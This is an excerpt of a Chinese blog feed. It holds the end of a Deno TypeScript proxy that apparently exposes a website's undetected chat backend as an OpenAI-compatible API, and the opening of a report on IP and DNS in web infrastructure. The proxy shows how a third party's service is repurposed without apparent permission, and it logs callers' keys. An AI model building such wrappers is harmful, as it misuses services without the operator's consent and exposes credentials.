class="attr">parent</span>: <span class="literal">null</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                ],</span><br><span class="line">            &#125;),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 路径和方法检查 ---</span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">pathname</span> !== <span class="string">&quot;/v1/chat/completions&quot;</span> || req.<span class="property">method</span> !== <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Not Found or Method Not Allowed&quot;</span> &#125;), &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">404</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// --- 添加认证检查 ---</span></span><br><span class="line">    <span class="keyword">const</span> authHeader = req.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> providedKey = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// 检查 Authorization header 是否存在且格式正确 (Bearer &lt;key&gt;)</span></span><br><span class="line">    <span class="keyword">if</span> (!authHeader || !authHeader.<span class="title function_">toLowerCase</span>().<span class="title function_">startsWith</span>(<span class="string">&quot;bearer &quot;</span>)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`认证失败: 缺少或格式错误的 Authorization header`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">error</span>: &#123;</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Unauthorized: Missing or invalid Authorization header. Use &#x27;Bearer &lt;YOUR_API_KEY&gt;&#x27; format.&quot;</span>,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&quot;invalid_request_error&quot;</span>,</span><br><span class="line">                <span class="attr">param</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">code</span>: <span class="string">&quot;missing_or_invalid_header&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">401</span>, <span class="comment">// Unauthorized</span></span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;WWW-Authenticate&quot;</span>: <span class="string">&#x27;Bearer realm=&quot;API Access&quot;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 提取 key 部分</span></span><br><span class="line">    providedKey = authHeader.<span class="title function_">substring</span>(<span class="number">7</span>); <span class="comment">// &quot;Bearer &quot;.length is 7</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;providedKey：&quot;</span> + providedKey);</span><br><span class="line">    <span class="comment">// 直接比较提供的 key 和硬编码的 key</span></span><br><span class="line">    <span class="keyword">if</span> (providedKey !== <span class="variable constant_">AUTH_KEY</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`认证失败: 无效的 API Key 提供`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">error</span>: &#123;</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&quot;Unauthorized: Invalid API Key provided.&quot;</span>,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&quot;invalid_request_error&quot;</span>,</span><br><span class="line">                <span class="attr">param</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">code</span>: <span class="string">&quot;inAUTH_KEY&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">401</span>, <span class="comment">// Unauthorized</span></span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">                <span class="string">&quot;WWW-Authenticate&quot;</span>: <span class="string">&#x27;Bearer realm=&quot;API Access&quot;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 处理 POST 请求 ---</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 解析入站请求体</span></span><br><span class="line">        <span class="keyword">let</span> <span class="attr">requestBody</span>: <span class="built_in">any</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            requestBody = <span class="keyword">await</span> req.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(requestBody)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to parse request JSON:&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Invalid JSON in request body&quot;</span> &#125;), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">400</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 检查是否请求流式响应</span></span><br><span class="line">        <span class="keyword">const</span> isStream = requestBody.<span class="property">stream</span> === <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 提取用户输入的内容 - 将 messages 数组转换为字符串</span></span><br><span class="line">        <span class="keyword">let</span> <span class="attr">userContent</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(requestBody.<span class="property">messages</span>) &amp;&amp; requestBody.<span class="property">messages</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 直接将整个 messages 数组转换为 JSON 字符串</span></span><br><span class="line">                userContent = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestBody.<span class="property">messages</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to stringify &#x27;messages&#x27; array:&quot;</span>, e);</span><br><span class="line">                <span class="comment">// 如果 JSON.stringify 失败 (虽然对数组不太可能，但以防万一)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Failed to process &#x27;messages&#x27; array.&quot;</span> &#125;), &#123;</span><br><span class="line">                    <span class="attr">status</span>: <span class="number">400</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查 userContent 是否成功生成</span></span><br><span class="line">        <span class="comment">// 如果 requestBody.messages 不存在、不是数组、为空，或者转换出错，userContent 会是 undefined</span></span><br><span class="line">        <span class="keyword">if</span> (!userContent) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Request body must contain a non-empty &#x27;messages&#x27; array.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Request body must contain a non-empty &#x27;messages&#x27; array.&quot;</span> &#125;), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">400</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 现在 userContent 包含了整个对话历史的字符串表示</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Formatted user content:&quot;</span>, userContent); <span class="comment">// 可以取消注释来调试输出</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">CHAT_ID</span> = <span class="keyword">await</span> <span class="title function_">createChatAndGetId</span>();<span class="comment">//获取新的聊天ID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 构建目标 API Payload</span></span><br><span class="line">        <span class="keyword">const</span> payload = &#123;</span><br><span class="line">            <span class="attr">json</span>: &#123;</span><br><span class="line">                <span class="attr">jsonrpc</span>: <span class="string">&quot;2.0&quot;</span>, <span class="attr">id</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(), <span class="attr">method</span>: <span class="string">&quot;sendMessage&quot;</span>,</span><br><span class="line">                <span class="attr">params</span>: [&#123; <span class="attr">chatId</span>: <span class="variable constant_">CHAT_ID</span>, <span class="attr">content</span>: userContent, <span class="attr">fileId</span>: <span class="literal">null</span>, <span class="attr">fileIds</span>: [] &#125;]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">meta</span>: &#123; <span class="attr">values</span>: &#123; <span class="string">&quot;params.0.fileId&quot;</span>: [<span class="string">&quot;undefined&quot;</span>] &#125; &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 发送请求到目标 API (无论是否流式，都需要先获取完整响应)</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Forwarding request to:&quot;</span>, <span class="variable constant_">TARGET_URL</span>);</span><br><span class="line">        <span class="keyword">const</span> targetResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="variable constant_">TARGET_URL</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">headers</span>: <span class="variable constant_">TARGET_HEADERS</span>, <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload),</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 处理目标 API 的响应</span></span><br><span class="line">        <span class="keyword">if</span> (!targetResponse.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> errorBody = <span class="keyword">await</span> targetResponse.<span class="title function_">text</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Target API Error (<span class="subst">$&#123;targetResponse.status&#125;</span>):`</span>, errorBody);</span><br><span class="line">            <span class="comment">// 即使是流式请求失败，也返回 JSON 错误</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">`Upstream API request failed with status <span class="subst">$&#123;targetResponse.status&#125;</span>`</span>, <span class="attr">details</span>: errorBody &#125;), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">502</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 解析目标 API 的 JSON 响应</span></span><br><span class="line">        <span class="keyword">let</span> <span class="attr">targetData</span>: <span class="built_in">any</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            targetData = <span class="keyword">await</span> targetResponse.<span class="title function_">json</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to parse target API response JSON:&quot;</span>, e);</span><br><span class="line">            <span class="comment">// 即使是流式请求失败，也返回 JSON 错误</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Failed to parse upstream API response&quot;</span> &#125;), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">500</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. 从目标响应中提取内容</span></span><br><span class="line">        <span class="keyword">const</span> assistantContent = targetData?.<span class="property">json</span>?.<span class="property">result</span>?.<span class="property">content</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> assistantContent !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Could not extract &#x27;content&#x27; from target API response:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(targetData));</span><br><span class="line">            <span class="comment">// 即使是流式请求失败，也返回 JSON 错误</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Invalid response format from upstream API&quot;</span> &#125;), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">500</span>, <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 9. 根据 isStream 决定返回格式</span></span><br><span class="line">        <span class="keyword">const</span> chatCompletionId = <span class="string">`chatcmpl-<span class="subst">$&#123;crypto.randomUUID()&#125;</span>`</span>; <span class="comment">// 为本次交互生成唯一 ID</span></span><br><span class="line">        <span class="keyword">const</span> modelName = requestBody.<span class="property">model</span> || <span class="variable constant_">PROXY_MODEL_NAME</span>; <span class="comment">// 确定模型名称</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isStream) &#123;</span><br><span class="line">            <span class="comment">// --- 返回模拟的流式响应 ---</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Simulating stream response...&quot;</span>);</span><br><span class="line">            <span class="keyword">const</span> encoder = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span><br><span class="line">            <span class="keyword">const</span> stream = <span class="keyword">new</span> <span class="title class_">ReadableStream</span>(&#123;</span><br><span class="line">                <span class="keyword">async</span> <span class="title function_">start</span>(<span class="params">controller</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 模拟发送块</span></span><br><span class="line">                        <span class="comment">// 块 1: 发送角色信息</span></span><br><span class="line">                        controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(</span><br><span class="line">                            <span class="title function_">createSSEChunk</span>(chatCompletionId, modelName, <span class="literal">null</span>, <span class="string">&quot;assistant&quot;</span>, <span class="literal">null</span>)</span><br><span class="line">                        ));</span><br><span class="line">                        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">10</span>)); <span class="comment">// 短暂延迟，模拟处理</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 块 2: 发送完整内容</span></span><br><span class="line">                        controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(</span><br><span class="line">                            <span class="title function_">createSSEChunk</span>(chatCompletionId, modelName, assistantContent, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">                        ));</span><br><span class="line">                        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">10</span>)); <span class="comment">// 短暂延迟</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 块 3: 发送结束信号</span></span><br><span class="line">                        controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(</span><br><span class="line">                            <span class="title function_">createSSEChunk</span>(chatCompletionId, modelName, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;stop&quot;</span>)</span><br><span class="line">                        ));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 发送 [DONE] 标记</span></span><br><span class="line">                        controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">&quot;data: [DONE]\n\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 关闭流</span></span><br><span class="line">                        controller.<span class="title function_">close</span>();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error during stream simulation:&quot;</span>, error);</span><br><span class="line">                        controller.<span class="title function_">error</span>(error); <span class="comment">// 通知流出错了</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(stream, &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/event-stream&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="comment">// 建议 SSE 使用</span></span><br><span class="line">                    <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// --- 返回完整的 JSON 响应 ---</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Returning non-stream response.&quot;</span>);</span><br><span class="line">            <span class="keyword">const</span> finalResponse = &#123;</span><br><span class="line">                <span class="attr">id</span>: chatCompletionId,</span><br><span class="line">                <span class="attr">object</span>: <span class="string">&quot;chat.completion&quot;</span>,</span><br><span class="line">                <span class="attr">created</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>),</span><br><span class="line">                <span class="attr">model</span>: modelName,</span><br><span class="line">                <span class="attr">choices</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">message</span>: &#123;</span><br><span class="line">                            <span class="attr">role</span>: <span class="string">&quot;assistant&quot;</span>,</span><br><span class="line">                            <span class="attr">content</span>: assistantContent,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="attr">finish_reason</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">                        <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">usage</span>: &#123; <span class="attr">prompt_tokens</span>: <span class="number">0</span>, <span class="attr">completion_tokens</span>: <span class="number">0</span>, <span class="attr">total_tokens</span>: <span class="number">0</span> &#125;,</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(finalResponse), &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="comment">// --- 全局错误处理 ---</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Unhandled error in handler:&quot;</span>, error);</span><br><span class="line">        <span class="comment">// 即使请求流式，也返回 JSON 错误</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Internal Server Error&quot;</span> &#125;), &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span> &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">serve</span>(handler);</span><br></pre></td></tr></table></figure></details>  <p>站点没有检测，所以我自己加了鉴权防止2to2。<br>生图能力<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746883412019_2api8.png" alt="2api8.png"><br>视频创造<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746883565331_2api9.png" alt="2api9.png"><br>强大的模型能力。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP协议与DNS协议在Web网站中的应用</title>
      <link href="/posts/5de8.html"/>
      <url>/posts/5de8.html</url>
      
        <content type="html"><![CDATA[<h1 id="IP协议与DNS协议在Web网站中的应用：技术架构、安全挑战"><a href="#IP协议与DNS协议在Web网站中的应用：技术架构、安全挑战" class="headerlink" title="IP协议与DNS协议在Web网站中的应用：技术架构、安全挑战"></a>IP协议与DNS协议在Web网站中的应用：技术架构、安全挑战</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本报告系统性地分析了IP与DNS协议在现代Web生态系统中的协同工作机制，基于2023-2024年最新行业数据与研究成果，从协议实现、性能优化、安全威胁及新兴技术四个维度展开深度探讨。特别聚焦IPv6迁移对DNS架构的影响、加密DNS的隐私悖论、区块链DNS的可行性等前沿议题，并给出可落地的技术建议。</p><h2 id="一、IP协议层的关键演进与Web适配"><a href="#一、IP协议层的关键演进与Web适配" class="headerlink" title="一、IP协议层的关键演进与Web适配"></a>一、IP协议层的关键演进与Web适配</h2><h3 id="1-1-IPv4与IPv6的性能分化现状"><a href="#1-1-IPv4与IPv6的性能分化现状" class="headerlink" title="1.1 IPv4与IPv6的性能分化现状"></a>1.1 IPv4与IPv6的性能分化现状</h3><p>根据APNIC 2024年全球测量数据，IPv6在Web场景中呈现出明显的性能双刃剑特征：</p><p><strong>延迟表现</strong></p><ul><li>优势场景：Google全球骨干网测量显示，IPv6 TCP连接建立时间减少18%（得益于NAT消除），北美地区平均延迟比IPv4低12ms</li><li>瓶颈场景：双栈转换导致印度Reliance Jio等ISP延迟反而增加20ms，主要由于DNS64&#x2F;NAT64转换开销（微软Azure实测数据）</li></ul><p><strong>吞吐量对比</strong><br>$$<br>\frac{Throughput_{IPv6}}{Throughput_{IPv4}} &#x3D; 1.08 \pm 0.03 \quad \text{(MTU&#x3D;1500条件下)}<br>$$<br>但Realtek RTL8125等网卡驱动因IPv6校验和卸载缺陷，实际用户体验增益缩水至3-5%</p><p><strong>路由效率</strong></p><pre class="mermaid">flowchart TD    A[用户请求] --> B{IPv6路径?}    B -->|是| C[平均AS_PATH=3.2跳]    B -->|否| D[IPv4平均AS_PATH=4.4跳]    C --> E[欧洲/北美优化明显]    D --> F[非洲等地可能多2-3跳]</pre><h3 id="1-2-迁移挑战的技术本质"><a href="#1-2-迁移挑战的技术本质" class="headerlink" title="1.2 迁移挑战的技术本质"></a>1.2 迁移挑战的技术本质</h3><p>中国电信2023年调研揭示三大核心障碍：</p><ol><li><p><strong>协议栈耦合问题</strong></p><ul><li>Linux 5.15+内核IPv6 Fast Path与XDP组合时，Jumbo Frame导致CPU软中断飙升至78%（Red Hat案例）</li><li>企业防火墙IPv6分片重组缺陷影响HTTP&#x2F;3支持率（23%设备存在兼容性问题）</li></ul></li><li><p><strong>CDN适配成本矩阵</strong></p></li></ol><table><thead><tr><th>优化维度</th><th>IPv4方案</th><th>IPv6增量成本</th></tr></thead><tbody><tr><td>边缘节点覆盖</td><td>全球成熟</td><td>东南亚需新增23%节点</td></tr><tr><td>缓存预热</td><td>自动完成</td><td>需人工干预（首字节时间增加30%）</td></tr><tr><td>Anycast路由</td><td>基于BGP</td><td>依赖RIPE Atlas探针数据调优</td></tr></tbody></table><ol start="3"><li><strong>硬件加速瓶颈</strong><ul><li>英特尔X710网卡IPv6流分类性能下降40%，需依赖SmartNIC卸载</li><li>巴西ANATEL强制合规后，IPv6丢包率反升1.8倍（IXP容量不足）</li></ul></li></ol><h2 id="二、DNS系统的现代负载均衡体系"><a href="#二、DNS系统的现代负载均衡体系" class="headerlink" title="二、DNS系统的现代负载均衡体系"></a>二、DNS系统的现代负载均衡体系</h2><h3 id="2-1-三大厂商实现范式对比"><a href="#2-1-三大厂商实现范式对比" class="headerlink" title="2.1 三大厂商实现范式对比"></a>2.1 三大厂商实现范式对比</h3><p><strong>Google Global Load Balancer架构</strong></p><pre class="mermaid">sequenceDiagram    用户->>GLB: DNS查询    GLB->>探针集群: 实时延迟检测(5s/次)    探针集群-->>GLB: 拓扑数据    GLB->>用户: 返回最优PoP点IP    用户->>边缘节点: 直接连接</pre><p><strong>Cloudflare的混合调度策略</strong></p><ul><li>地理分区：200+区域划分，优先返回同AS内IP</li><li>动态优化：Argo智能路由降低延迟15-30%</li><li>抗DDoS：Anycast IP池自动扩容，2023年成功防御1.3Tbps攻击</li></ul><p><strong>关键性能指标对比</strong></p><table><thead><tr><th>厂商</th><th>健康检查频率</th><th>SLA保证</th><th>跨洲延迟差异</th></tr></thead><tbody><tr><td>Google GLB</td><td>5秒</td><td>99.99%</td><td>&lt;50ms</td></tr><tr><td>AWS Route53</td><td>15秒</td><td>99.95%</td><td>&lt;80ms</td></tr><tr><td>阿里云DNS</td><td>60秒</td><td>99.9%</td><td>&lt;120ms</td></tr></tbody></table><h3 id="2-2-EDNS-Client-Subnet的隐私困局"><a href="#2-2-EDNS-Client-Subnet的隐私困局" class="headerlink" title="2.2 EDNS Client Subnet的隐私困局"></a>2.2 EDNS Client 